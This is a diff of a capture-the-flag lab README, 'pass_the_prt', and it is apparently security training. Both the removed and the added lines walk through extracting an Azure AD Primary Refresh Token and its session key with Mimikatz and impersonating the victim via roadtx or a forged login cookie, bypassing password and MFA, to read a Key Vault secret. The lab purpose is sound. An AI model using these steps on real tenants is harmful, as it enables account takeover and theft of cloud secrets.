@@ -6,7 +6,7 @@
 
 A Windows Server VM is Azure AD-joined. A corporate user (`ptp-victim-*`) routinely signs in to this workstation with their Azure AD credentials, which causes Windows to cache a **Primary Refresh Token (PRT)** in LSASS. The PRT is a long-lived SSO credential — equivalent to a Kerberos TGT for the cloud — that Azure AD accepts to issue tokens for any Microsoft resource, including the Key Vault where the flag lives.
 
-You have compromised the machine and hold local admin rights. The victim user has already logged on (step 1 below simulates this). Your goal is to extract the PRT, craft a forged cookie, and authenticate to Azure as the victim, without any password or MFA prompt. The tokens you obtain carry the victim's device identity and the authentication strength of their original sign-in.
+You have compromised the machine and hold local admin rights. The victim user has already logged on (step 1 below simulates this). Your goal is to extract the PRT and its session key, then sign in to the Azure portal as the victim, without any password or MFA prompt. The tokens you obtain carry the victim's device identity and the authentication strength of their original sign-in.
 
 ## Background: what is a PRT?
 
@@ -18,7 +18,7 @@ On a device with a TPM, the session key is bound to the TPM and cannot be export
 
 ## Prerequisites
 
-> ⚠️ **Security Defaults must be disabled** in your Entra ID tenant before deploying this lab. Security Defaults enforce MFA on Azure Management (ARM), which blocks subscription enumeration even with a valid PRT.
+> ⚠️ **Security Defaults must be disabled** in your Entra ID tenant before deploying this lab. Security Defaults enforce MFA on Azure management, including the Azure portal, which blocks the portal sign-in even with a valid PRT (the lab's PRT carries no MFA claim).
 >
 > **Azure portal → Entra ID → Properties → Manage security defaults → Disabled**
 
@@ -68,108 +68,36 @@ token::elevate
 dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect
 ```
 
-The output shows **three values** — copy all of them:
-- **Context** — the nonce embedded in the key blob
-- **Clear key** — the raw DPAPI-decrypted session key (used by roadtx)
-- **Derived Key** — `HMAC-SHA256(Clear key, Context)` (used by Mimikatz cookie generation)
+Copy the **Clear key**, the raw DPAPI-decrypted session key. The output also shows a Context and a Derived Key, which you do not need.
 
-> **Important:** `Clear key` and `Derived Key` are different. roadtx expects the **Clear key**. Passing the Derived Key to roadtx causes authentication to fail (AADSTS500061).
+> **Important:** use the `Clear key`, not the `Derived Key`. roadtx fails to authenticate with the Derived Key (AADSTS500061).
 
-### Step 4 — Authenticate as the victim (roadtx — recommended)
+### Step 4 — Sign in to the Azure portal as the victim
 
-On your attacking machine, use [roadtx](https://github.com/dirkjanm/ROADtools) with the **Clear key**.
-
-#### 4a — Enumerate the subscription to discover resources
-
-An attacker does not know the Key Vault name upfront. Get an ARM token first and enumerate:
+On your attacking machine, install [roadtx](https://github.com/dirkjanm/ROADtools) (`pip install roadtx`), Firefox and [geckodriver](https://github.com/mozilla/geckodriver/releases). roadtx drives the browser through Selenium.
 
 ```shell
-roadtx prtauth \
+roadtx browserprtauth \
   --prt <PRT> \
   --prt-sessionkey <Clear_key> \
-  --resource https://management.azure.com/
+  --url https://portal.azure.com
 ```
 
-Load the token into Azure PowerShell and list all Key Vaults the victim can access:
+A browser window opens, already signed in as the victim, with no password or MFA prompt. roadtx requests a fresh nonce from Entra ID and signs it with the session key, exactly as the victim's device would.
 
-```powershell
-$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
-Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
-Get-AzKeyVault
-```
+> If roadtx cannot find the driver, pass its location with `--driver-path`. Run `roadtx browserprtauth -h` for the options of your roadtx version.
 
-> `Connect-AzAccount -AccessToken` lets you inject any Bearer token directly into the Az PowerShell session — no interactive login needed.
+### Step 5 — Read the flag from Key Vault
 
-#### 4b — Read the flag from Key Vault
+In the portal, still signed in as the victim:
 
-Get a Key Vault-scoped token and read the secret:
+1. Search for **Key vaults** and open `<keyvault_name>`
+2. **Objects** → **Secrets** → `flag`
+3. Click the current version → **Show Secret Value**
 
-```shell
-roadtx prtauth \
-  --prt <PRT> \
-  --prt-sessionkey <Clear_key> \
-  --resource https://vault.azure.net/
-```
+The victim holds **Reader** on the vault (so it appears in the portal) and **Key Vault Secrets User** (so the secret value can be shown). The attacker's local account has neither.
 
-```powershell
-$kvToken = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
-$headers = @{ Authorization = "Bearer $kvToken" }
-(Invoke-RestMethod -Uri "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" -Headers $headers).value
-```
-
-Or with curl:
-
-```shell
-TOKEN=$(python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" \
-  | python3 -m json.tool
-```
-
-### Step 5 — Authenticate as the victim (browser cookie — alternative)
-
-Generate a signed PRT cookie using Mimikatz (uses the **Derived Key**):
-
-```
-dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>
-```
-
-The output ends with `Signature with key:` — copy that full value. **Use it immediately** (the nonce expires in ~1 minute).
-
-On **any machine**, open Microsoft Edge or Chrome in **private/incognito** mode:
-
-1. Navigate to `https://login.microsoftonline.com`
-2. Open Developer Tools (`F12`) → **Application** → **Cookies** → `https://login.microsoftonline.com` → delete all cookies
-3. Add a new cookie:
-
-| Field    | Value                             |
-|----------|-----------------------------------|
-| Name     | `x-ms-RefreshTokenCredential`     |
-| Value    | `<paste the signed cookie value>` |
-| Domain   | `login.microsoftonline.com`       |
-| Path     | `/`                               |
-| HttpOnly | ✓                                 |
-| Secure   | ✓                                 |
-
-4. In the address bar type `https://login.microsoftonline.com` and press Enter (do not just press F5)
-5. Enter the victim's UPN (`ptp-victim-XXXX@yourdomain.onmicrosoft.com`) — Azure AD reads the cookie during the credential phase and signs you in with **no password or MFA prompt**
-
-### Step 6 — Read the flag from Key Vault
-
-Via the Azure portal (authenticated as victim in browser):
-
-1. Navigate to **Key Vaults** → `<keyvault_name>`
-2. **Secrets** → `flag` → click the version → **Show Secret Value**
-
-Or with PowerShell using an ARM token from roadtx:
-
-```powershell
-$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
-Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
-Get-AzKeyVaultSecret -VaultName <keyvault_name> -Name flag -AsPlainText
-```
-
-### Step 7 — Submit the flag
+### Step 6 — Submit the flag
 
 ```shell
 cnimbus azure validate --app-id pass_the_prt --flag "CUMULONIMBUS{...}"
